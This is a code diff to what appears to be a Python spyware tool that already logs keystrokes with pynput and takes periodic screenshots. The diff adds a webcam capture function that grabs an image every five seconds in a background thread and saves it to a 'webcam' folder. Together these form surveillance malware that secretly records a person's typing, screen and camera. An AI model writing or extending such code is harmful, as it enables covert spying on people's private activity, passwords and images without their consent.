@@ -15,6 +15,7 @@ from multiprocessing import Process
 # external libaries 
 from pynput.keyboard import Listener
 from PIL import ImageGrab
+import cv2 
 
 
 
@@ -68,9 +69,43 @@ def capture_screenshots(screenshots_path, interval=6):
             logging.error(f"Error capturing screenshot: {e}")
             print(f"Error capturing screenshot: {e}")
 
+
+
+def capture_webcam_images(webcam_path, interval=5):
+    """
+    Captures webcam images at regular intervals and saves them to the specified directory.
+    
+    Args:
+        webcam_path (str): Directory where webcam images will be stored.
+        interval (int): Interval between webcam captures in seconds.
+    """
+    cam = cv2.VideoCapture(0)
+    count = 1
+
+    while True:
+        try:
+            result, image = cam.read()
+            if result:
+                file_name = os.path.join(webcam_path, f'webcam_image_{count}.png')
+                cv2.imwrite(file_name, image)
+                count += 1
+                time.sleep(interval)
+            else:
+                logging.error("Error capturing webcam image: Camera read failed")
+                print("Error capturing webcam image: Camera read failed")
+        except Exception as e:
+            logging.error(f"Error capturing webcam image: {e}")
+            print(f"Error capturing webcam image: {e}")
+
+    cam.release()
+
+
+
 def capture_screenvideos(path):
     # Placeholder for screen video capture implementation
     pass
+
+
 
 # main function 
 def main(): 
@@ -90,8 +125,9 @@ def main():
     keys = os.path.join(global_path, 'keys.txt')
     screenshots_path = os.path.join(global_path, 'screenshots')
     screenvideos_path = os.path.join(global_path, 'screenvideos')
+    webcam_path = os.path.join(global_path, 'webcam')
 
-    for path in [screenshots_path, screenvideos_path]:
+    for path in [screenshots_path, screenvideos_path, webcam_path]:
         if not os.path.exists(path):
             os.makedirs(path)
  
@@ -103,6 +139,14 @@ def main():
     interval = 6
     screenshots_thread = Thread(target=capture_screenshots, args=(screenshots_path, interval))
     screenshots_thread.start()
+
+
+
+
+    webcam_interval = 5
+    webcam_thread = Thread(target=capture_webcam_images, args=(webcam_path, webcam_interval))
+    webcam_thread.start()
+
 
     screenvideos_thread = Thread(target=capture_screenvideos, args=(screenvideos_path,))
     screenvideos_thread.start()
